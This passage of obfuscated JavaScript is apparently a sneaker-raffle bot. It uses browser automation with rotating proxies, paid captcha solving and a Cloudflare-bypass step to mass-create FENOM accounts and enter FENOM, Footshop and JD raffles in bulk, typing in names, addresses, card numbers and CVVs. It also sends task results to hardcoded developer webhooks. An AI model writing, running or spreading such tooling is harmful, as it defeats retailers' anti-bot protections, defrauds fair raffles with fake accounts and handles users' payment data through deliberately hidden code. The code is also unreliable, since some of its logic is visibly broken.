                            console['log'](_0x441ea7() + '\x20[' + _0x1c061a['name'] + ']\x20Task\x20' + (_0xfc28d2 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2e8cb0['type']('input[name=\x22firstname\x22]', '' + _0x734df2[_0xfc28d2]['FirstName']), await _0x7e80ad(0x1f4), await _0x2e8cb0['type']('input[name=\x22lastname\x22]', '' + _0x734df2[_0xfc28d2]['LastName']), await _0x7e80ad(0x1f4), await _0x2e8cb0['type']('input[name=\x22email\x22]', '' + _0x734df2[_0xfc28d2]['Email']), await _0x7e80ad(0x1f4), await _0x2e8cb0['type']('input[name=\x22password\x22]', '' + _0x734df2[_0xfc28d2]['Password']), await _0x7e80ad(0x258), await _0x2e8cb0['$eval']('input[name=\x22psgdpr\x22]', _0x5528bf => _0x5528bf['click']()), await _0x7e80ad(0x1f4), console['log'](_0x441ea7() + '\x20[' + _0x1c061a['name'] + ']\x20Task\x20' + (_0xfc28d2 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2e8cb0['$eval']('#customer-form', _0xa0f359 => _0xa0f359['submit']());
                            try {
                                await _0x2e8cb0['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x4f24ef = 'no', console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x1c061a['name'] + ']\x20Task\x20' + (_0xfc28d2 + 0x1) + '\x20:\x20Account\x20' + _0x734df2[_0xfc28d2]['Email'] + '\x20Generated')), _0x40e0db['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x734df2[_0xfc28d2]['Email'] + ',' + _0x734df2[_0xfc28d2]['Password']);
                                try {
                                    _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x171436['succesDEVMSG']);
                                } catch {
                                }
                                await _0x10a0d6(_0x54e762, _0x171436['succesDEVMSG']);
                            } catch (_0x45675c) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x45675c);
                            }
                        } catch (_0x15fbf7) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x1c061a['name'] + ']\x20Task\x20' + (_0xfc28d2 + 0x1) + '\x20:\x20' + _0x15fbf7)), _0x59860d = '' + _0x15fbf7;
                            var _0x290570 = await _0x296449(_0x734df2[_0xfc28d2], _0x1c061a, 'acc', !![], _0x59860d);
                            _0x171436['errorDEV'] = { 'embeds': [_0x290570] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x171436['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x171436['errorDEV']), _0x4f24ef = 'yes';
                        } finally {
                            _0x257e0b['close']();
                            if (_0x4f24ef == 'yes' && _0x539dc5 != 0x5 && _0x59860d != 'Size\x20Not\x20Found') {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x1c061a['name'] + ']\x20Task\x20' + (_0xfc28d2 + 0x1) + '\x20:\x20Retrying')), _0xfc28d2 = _0xfc28d2 - 0x1, _0x539dc5 = _0x539dc5 + 0x1;
                                continue;
                            }
                            _0x4f24ef == 'yes' && _0x539dc5 >= 0x5 && (_0xc1caad(_0x734df2[_0xfc28d2], _0x1c061a), _0x4f24ef = 'no', _0x539dc5 = 0x0), console['log'](_0x441ea7() + '\x20[' + _0x1c061a['name'] + ']\x20Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x198dcc(_0x9e12dc, _0x4b7cad, _0x338f71) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5898a3 = 0x0; _0x5898a3 < _0x4b7cad['length']; _0x5898a3++) {
                        if (_0x669274 != 'yes')
                            var _0x669274 = '', _0x1b83ec = 0x0;
                        var _0x39a274;
                        await _0x6f470f(_0x4b7cad, _0x5898a3), _0x16d703(_0x9e12dc['name'] + '\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20/\x20' + _0x4b7cad['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7);
                        const _0x24c7f1 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x420550 = Math['round'](Math['random']() * (_0x338f71['length'] - 0x1)), _0x226be2 = _0x338f71[_0x420550]['split'](':'), _0x4091a8;
                        try {
                            _0x4091a8 = await _0x25d1cc['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x226be2[0x0] + ':' + _0x226be2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4091a8 = await _0x25d1cc['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x226be2[0x0] + ':' + _0x226be2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x382ae3 = await _0x4091a8['newPage'](), _0x7f02e9 = await _0x382ae3['target']()['createCDPSession'](), { windowId: _0x2dd579 } = await _0x7f02e9['send']('Browser.getWindowForTarget');
                            await _0x382ae3['authenticate']({
                                'username': '' + _0x226be2[0x2],
                                'password': '' + _0x226be2[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x382ae3['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x7e80ad(0xbb8), await _0x7f02e9['send']('Browser.setWindowBounds', {
                                'windowId': _0x2dd579,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x7e80ad(0x1f40);
                            try {
                                await _0x382ae3['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x7e80ad(0x1388), console['log'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20Logging\x20in'), await _0x382ae3['type']('input[name=\x22email\x22]', '' + _0x4b7cad[_0x5898a3]['Email']), await _0x7e80ad(0x1f4), await _0x382ae3['type']('input[name=\x22password\x22]', '' + _0x4b7cad[_0x5898a3]['Password']), await _0x7e80ad(0x258), await _0x382ae3['$eval']('#login-form', _0x17782f => _0x17782f['submit']()), await _0x382ae3['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x7e80ad(0x1f4), await _0x382ae3['goto']('' + _0x4b7cad[_0x5898a3]['Url']), await _0x382ae3['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4b7cad[_0x5898a3]['Size']);
                            if (_0x4b7cad[_0x5898a3]['Size'] != 'RANDOM') {
                                var _0x1ca844 = '\x20' + _0x4b7cad[_0x5898a3]['Size'] + '\x20';
                                const _0x2f8f22 = await _0x382ae3['$x']('//span[contains(text(),\x20' + _0x1ca844 + ')]');
                                await _0x2f8f22[0x0]['click']();
                            } else {
                                const _0x5764e3 = await _0x382ae3['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x13bc33 = Math['round'](Math['random']() * (_0x5764e3['length'] - 0x1));
                                await _0x5764e3[_0x13bc33]['click']();
                            }
                            await _0x7e80ad(0x258), await _0x382ae3['click']('#cookieChoiceDismiss'), await _0x7e80ad(0x3e8), await _0x382ae3['type']('#instagram-account', '' + _0x4b7cad[_0x5898a3]['Follower']), await _0x7e80ad(0x28a), await _0x382ae3['click']('#book-btn'), await _0x7e80ad(0xbb8), await _0x382ae3['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x7e80ad(0x1f4), console['log'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20' + _0x1a235e['cyan']('Solving\x20Captcha')), await _0x382ae3['solveRecaptchas'](), console['log'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x7e80ad(0x7d0), await _0x382ae3['$eval']('#book-btn-for-sure', _0x563008 => _0x563008['click']()), await _0x7e80ad(0x12c), await _0x382ae3['click']('#book-btn-for-sure'), await _0x7e80ad(0xdac);
                            const _0x216bab = await _0x382ae3['$eval']('.reservation-popup\x20>\x20.title', _0x48ca4f => {
                                return _0x48ca4f['innerHTML'];
                            });
                            if (_0x216bab) {
                                _0x669274 = 'no', _0x4bdc1f(_0x4b7cad[_0x5898a3], _0x9e12dc), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x5bb047 = await _0x296449(_0x4b7cad[_0x5898a3], _0x9e12dc, 'dev', ![]), _0x5e0dae = await _0x296449(_0x4b7cad[_0x5898a3], _0x9e12dc, 'pub', ![]);
                                const _0x4b600b = {
                                    'succesDEVMSG': { 'embeds': [_0x5bb047] },
                                    'succesPUBMSG': { 'embeds': [_0x5e0dae] }
                                };
                                try {
                                    _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x4b600b['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x4b600b['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x355433, _0x4b600b['succesPUBMSG']);
                                } catch (_0x255daf) {
                                    console['log'](_0x1a235e['yellow'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x255daf));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x5980cc) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20' + _0x5980cc)), _0x39a274 = '' + _0x5980cc;
                            var _0x2adbf8 = await _0x296449(_0x4b7cad[_0x5898a3], _0x9e12dc, 'dev', !![], _0x39a274), _0x5bb047 = await _0x296449(_0x4b7cad[_0x5898a3], _0x9e12dc, 'dev', ![]), _0x5e0dae = await _0x296449(_0x4b7cad[_0x5898a3], _0x9e12dc, 'pub', ![]);
                            const _0x5ea4b8 = {
                                'succesDEVMSG': { 'embeds': [_0x5bb047] },
                                'succesPUBMSG': { 'embeds': [_0x5e0dae] }
                            };
                            _0x5ea4b8['errorDEV'] = { 'embeds': [_0x2adbf8] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x5ea4b8['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x5ea4b8['errorDEV']), _0x5980cc != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x669274 = 'yes');
                        } finally {
                            _0x4091a8['close']();
                            if (_0x669274 == 'yes' && _0x1b83ec != 0x5 && _0x39a274 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Task\x20' + (_0x5898a3 + 0x1) + '\x20:\x20Retrying')), _0x5898a3 = _0x5898a3 - 0x1, _0x1b83ec = _0x1b83ec + 0x1;
                                continue;
                            }
                            _0x669274 == 'yes' && _0x1b83ec >= 0x5 && (_0xc1caad(_0x4b7cad[_0x5898a3], _0x9e12dc), _0x669274 = 'no', _0x1b83ec = 0x0), console['log'](_0x441ea7() + '\x20[' + _0x9e12dc['name'] + ']\x20Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x16db98, _0x2422c4, _0x47123f) {
                _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x8702f0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3c6344 = 0x0; _0x3c6344 < _0x2422c4['length']; _0x3c6344++) {
                    var _0x56e9de;
                    if (_0x597f95 != 'yes')
                        var _0x597f95 = '', _0x88b447 = 0x0;
                    var _0x5b385c = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x397af7
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x2422c4[_0x3c6344]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2422c4[_0x3c6344]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x8702f0['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x4a89e9
                            }
                        ]
                    }], _0x1de424 = await _0x296449(_0x2422c4[_0x3c6344], _0x16db98, 'dev', ![]), _0xd23f2 = await _0x296449(_0x2422c4[_0x3c6344], _0x16db98, 'pub', ![]);
                    const _0x55dfa9 = {
                        'succesDEVMSG': { 'embeds': [_0x1de424] },
                        'succesPUBMSG': { 'embeds': [_0xd23f2] }
                    }, _0x43629b = { 'embeds': _0x5b385c };
                    await _0x6f470f(_0x2422c4, _0x3c6344);
                    if (_0x2422c4[_0x3c6344]['Email'] == '' || _0x2422c4[_0x3c6344]['FirstName'] == '' || _0x2422c4[_0x3c6344]['LastName'] == '' || _0x2422c4[_0x3c6344]['Country'] == '' || _0x2422c4[_0x3c6344]['Size'] == '' || _0x2422c4[_0x3c6344]['Address1'] == '' || _0x2422c4[_0x3c6344]['Zip'] == '') {
                        console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2422c4[_0x3c6344]['Email'] == '' || _0x2422c4[_0x3c6344]['FirstName'] == '' || _0x2422c4[_0x3c6344]['LastName'] == '' || _0x2422c4[_0x3c6344]['Country'] == '' || _0x2422c4[_0x3c6344]['Size'] == '' || _0x2422c4[_0x3c6344]['Address1'] == '' || _0x2422c4[_0x3c6344]['Zip'] == '' || _0x2422c4[_0x3c6344]['Phone'] == '') {
                        console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x55a238 = '' + _0x2422c4[_0x3c6344]['Url'];
                    if (_0x8702f0['useRandomProxy'] = ![])
                        var _0x5d6ce3 = _0x47123f[_0x3c6344]['split'](':');
                    else
                        var _0x14dbfb = Math['round'](Math['random']() * (_0x47123f['length'] - 0x1)), _0x5d6ce3 = _0x47123f[_0x14dbfb]['split'](':');
                    const _0x3cafba = await _0x25d1cc['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x5d6ce3[0x0] + ':' + _0x5d6ce3[0x1]]
                    });
                    try {
                        const _0x2223f9 = await _0x3cafba['newPage']();
                        await _0x2223f9['authenticate']({
                            'username': '' + _0x5d6ce3[0x2],
                            'password': '' + _0x5d6ce3[0x3]
                        }), console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2223f9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2223f9['setRequestInterception'](!![]), _0x2223f9['on']('request', _0x3b965c => {
                            _0x3b965c['resourceType']() === 'image' || _0x3b965c['resourceType']() === 'font' || _0x3b965c['resourceType']() === 'media' ? _0x3b965c['abort']() : _0x3b965c['continue']();
                        }), await _0x2223f9['goto'](_0x55a238), await _0x7e80ad(0xbb8), await _0x2223f9['waitForSelector']('.control__JhutY'), await _0x2223f9['click']('.control__JhutY'), await _0x7e80ad(0x1f4);
                        if (_0x2422c4[_0x3c6344]['Size'] != 'RANDOM')
                            try {
                                const _0x5b266f = await _0x2223f9['$x']('//div[contains(text(),\x20\x27' + _0x2422c4[_0x3c6344]['Size'] + '\x27)]');
                                await _0x5b266f[0x0]['click']();
                            } catch {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x2f85cc = await _0x2223f9['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0xb3e176 = Math['round'](Math['random']() * (_0x2f85cc['length'] - 0x1));
                            await _0x2f85cc[_0xb3e176]['click']();
                        }
                        await _0x7e80ad(0x4b0);
                        const _0x22bc55 = await _0x2223f9['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x22bc55[0x0]['click'](), await _0x2223f9['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x2223f9['type']('input[name=\x22email\x22]', '' + _0x2422c4[_0x3c6344]['Email']), await _0x7e80ad(0x640), await _0x2223f9['type']('input[name=\x22phone\x22]', '' + _0x2422c4[_0x3c6344]['Phone']), await _0x7e80ad(0x4b0), await _0x2223f9['click']('button.btn.continue-button__1RtsS'), await _0x7e80ad(0x4b0);
                        try {
                            await _0x2223f9['type']('input[name=\x22firstName\x22]', '' + _0x2422c4[_0x3c6344]['FirstName']), await _0x7e80ad(0x258);
                        } catch {
                            const _0x46de2c = await _0x2223f9['$$eval']('.invalid-feedback\x20>\x20div', _0x77fe2 => {
                                return _0x77fe2['map'](_0x307e44 => _0x307e44['innerText']);
                            });
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20' + _0x46de2c));
                            continue;
                        }
                        await _0x2223f9['type']('input[name=\x22lastName\x22]', '' + _0x2422c4[_0x3c6344]['LastName']), await _0x7e80ad(0xc8), await _0x2223f9['type']('input[name=\x22instagramUsername\x22]', '' + _0x2422c4[_0x3c6344]['Follower']), await _0x7e80ad(0x4b0), await _0x2223f9['click']('button.btn.continue-button__1RtsS'), await _0x7e80ad(0x3e8), console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x2223f9['select']('select[name=\x22country\x22]', '' + _0x2422c4[_0x3c6344]['Country']), await _0x7e80ad(0x2bc), await _0x2223f9['type']('input[name=\x22streetName\x22]', '' + _0x2422c4[_0x3c6344]['Address1']), await _0x7e80ad(0x258), await _0x2223f9['type']('input[name=\x22houseNumber\x22]', _0x2422c4[_0x3c6344]['HouseNumber'] + '\x20' + _0x2422c4[_0x3c6344]['Address2']), await _0x7e80ad(0xc8), await _0x2223f9['type']('input[name=\x22postalCode\x22]', '' + _0x2422c4[_0x3c6344]['Zip']), await _0x7e80ad(0x1f4), await _0x2223f9['type']('input[name=\x22city\x22]', '' + _0x2422c4[_0x3c6344]['City']), await _0x7e80ad(0x4b0), await _0x2223f9['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x7e80ad(0x4b0), await _0x2223f9['click']('button.btn.continue-button__1RtsS'), await _0x7e80ad(0x4b0), console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x2223f9['solveRecaptchas'](), console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x7e80ad(0xbb8), await _0x2223f9['click']('button.btn.continue-button__1RtsS'), await _0x7e80ad(0x1388), console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x2223f9['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2223f9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x7e80ad(0x4b0), await _0x2223f9['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2422c4[_0x3c6344]['CardNumber']), await _0x7e80ad(0x320), await _0x2223f9['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2223f9['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2422c4[_0x3c6344]['ExpiryDate']), await _0x7e80ad(0x4b0), await _0x2223f9['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2223f9['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2422c4[_0x3c6344]['CVV']), await _0x7e80ad(0x226), await _0x2223f9['type']('input[name=\x22holderName\x22]', '' + _0x2422c4[_0x3c6344]['NameOnCard']), await _0x7e80ad(0x226), await _0x2223f9['click']('button.adyen-checkout__button'), console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x2223f9['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x7e80ad(0xbb8);
                        } catch (_0x6c2637) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x203DS\x20Failed')), _0x56e9de = '3DS\x20Error\x20' + _0x6c2637;
                            var _0x436744 = await _0x296449(_0x2422c4[_0x3c6344], _0x16db98, 'dev', !![], _0x56e9de);
                            _0x55dfa9['errorDEV'] = { 'embeds': [_0x436744] };
                            _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x55dfa9['errorDEV']);
                            await _0x10a0d6(_0x5cf6ec, _0x55dfa9['errorDEV']);
                            continue;
                        }
                        _0x4bdc1f(_0x2422c4[_0x3c6344], _0x16db98), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                            try {
                                await _0x10a0d6(_0x8702f0['webhook'], _0x55dfa9['succesDEVMSG']);
                            } catch {
                            }
                        await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x55dfa9['succesDEVMSG']), await _0x7e80ad(0xc8);
                        try {
                            await _0x10a0d6(_0x355433, _0x55dfa9['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0xbba301) {
                        console['log'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20' + _0xbba301), _0x56e9de = '' + _0xbba301;
                        var _0x436744 = await _0x296449(_0x2422c4[_0x3c6344], _0x16db98, 'dev', !![], _0x56e9de);
                        _0x55dfa9['errorDEV'] = { 'embeds': [_0x436744] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x55dfa9['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x55dfa9['errorDEV']), _0x597f95 = 'yes';
                    } finally {
                        _0x3cafba['close']();
                        if (_0x597f95 == 'yes' && _0x88b447 != 0x5) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x16db98['name'] + ']\x20Task\x20' + (_0x3c6344 + 0x1) + '\x20:\x20Retrying')), _0x3c6344 = _0x3c6344 - 0x1, _0x88b447 = _0x88b447 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x8702f0['footshopDelay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0xcb64b9, _0x280f74, _0x1832af) {
                var _0x1586d1 = ![], _0x19bb52 = ![];
                if (_0x8702f0['captchaKey'] == '' || _0x8702f0['captchaKey'] == undefined)
                    return console['log'](_0x1a235e['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x8702f0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x69efb2 = 0x0; _0x69efb2 < _0x280f74['length']; _0x69efb2++) {
                    if (_0x478f6e != 'yes')
                        var _0x478f6e = '', _0x15f107 = 0x0;
                    var _0x1d6574, _0x802e60 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x280f74[_0x69efb2]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x280f74[_0x69efb2]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x397af7
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x8702f0['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x4a89e9
                            }
                        ]
                    }];
                    const _0x53c908 = { 'embeds': _0x802e60 };
                    _0x16d703(_0xcb64b9['name'] + '\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20/\x20' + _0x280f74['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x280f74, _0x69efb2);
                    var _0x5365f9 = await _0x296449(_0x280f74[_0x69efb2], _0xcb64b9, 'dev', ![]), _0x542cf8 = await _0x296449(_0x280f74[_0x69efb2], _0xcb64b9, 'pub', ![]);
                    const _0x1593cc = {
                        'succesDEVMSG': { 'embeds': [_0x5365f9] },
                        'succesPUBMSG': { 'embeds': [_0x542cf8] }
                    };
                    if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                        try {
                            await _0x10a0d6(_0x8702f0['webhook'], _0x1593cc['succesDEVMSG']);
                        } catch {
                        }
                    await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x1593cc['succesDEVMSG']), await _0x7e80ad(0xc8);
                    try {
                        await _0x10a0d6(_0x355433, _0x1593cc['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x280f74[_0x69efb2]['Email'] == '' || _0x280f74[_0x69efb2]['Url'] == '' || _0x280f74[_0x69efb2]['FirstName'] == '' || _0x280f74[_0x69efb2]['LastName'] == '') {
                        console['log'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x8702f0['useRandomProxy'] = ![])
                        var _0x5b5dda = _0x1832af[_0x69efb2]['split'](':');
                    else
                        var _0x544601 = Math['round'](Math['random']() * (_0x1832af['length'] - 0x1)), _0x5b5dda = _0x1832af[_0x544601]['split'](':');
                    const _0xfef8f = await _0x25d1cc['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x5b5dda[0x0] + ':' + _0x5b5dda[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x4b0793 = await _0xfef8f['newPage']();
                        await _0x4b0793['authenticate']({
                            'username': '' + _0x5b5dda[0x2],
                            'password': '' + _0x5b5dda[0x3]
                        }), console['log'](_0x441ea7() + '\x20[' + _0xcb64b9['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4b0793['setRequestInterception'](!![]), _0x4b0793['on']('request', _0x3d4529 => {
                            _0x3d4529['resourceType']() === 'image' || _0x3d4529['resourceType']() === 'font' || _0x3d4529['resourceType']() === 'media' ? _0x3d4529['abort']() : _0x3d4529['continue']();
                        }), await _0x4b0793['goto']('' + _0x280f74[_0x69efb2]['Url'], {
